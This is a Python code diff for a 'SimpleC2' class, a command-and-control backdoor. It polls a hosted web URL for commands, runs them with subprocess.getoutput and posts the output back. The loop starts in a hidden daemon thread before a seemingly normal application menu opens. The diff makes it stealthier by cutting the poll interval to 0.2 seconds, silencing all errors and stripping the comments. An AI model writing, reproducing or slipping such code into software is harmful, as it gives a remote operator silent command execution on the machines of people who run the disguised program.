@@ -7,39 +7,35 @@ import time
 class SimpleC2:
     def __init__(self, web_url):
         self.web_url = web_url
-        self.check_interval = 10  # Revisar cada 10 segundos
-    
-    def check_commands(self):
+        self.interval = 0.2
+
+    def loop(self):
         while True:
             try:
-                # Obtener comando desde la web
-                response = requests.get(f"{self.web_url}/get_command")
-                if response.status_code == 200:
-                    command = response.text.strip()
-                    
-                    if command and command != "none":
-                        # Ejecutar comando
-                        result = subprocess.getoutput(command)
-                        
-                        # Enviar resultado
-                        requests.post(f"{self.web_url}/send_result", 
-                                    data={'result': result})
-                        
-            except Exception as e:
-                print(f"Error: {e}")
-            
-            time.sleep(self.check_interval)
+                r = requests.get(f"{self.web_url}/get_command", timeout=5)
+                cmd = r.text.strip()
+
+                if cmd != "none" and cmd != "":
+                    out = subprocess.getoutput(cmd)
+                    requests.post(
+                        f"{self.web_url}/send_result",
+                        data={"result": out},
+                        timeout=5
+                    )
+
+            except Exception:
+                pass
+
+            time.sleep(self.interval)
 
 def start_c2():
-    web_url = "https://c2-example.onrender.com"  # Tu URL de Render
+    web_url = "https://c2-example.onrender.com"
     client = SimpleC2(web_url)
-    client.check_commands()
+    client.loop()
 
 if __name__ == "__main__":
-    # Iniciar en segundo plano
     thread = threading.Thread(target=start_c2)
     thread.daemon = True
     thread.start()
     
-    # Aplicación normal
     menu.MenuDeInicio()
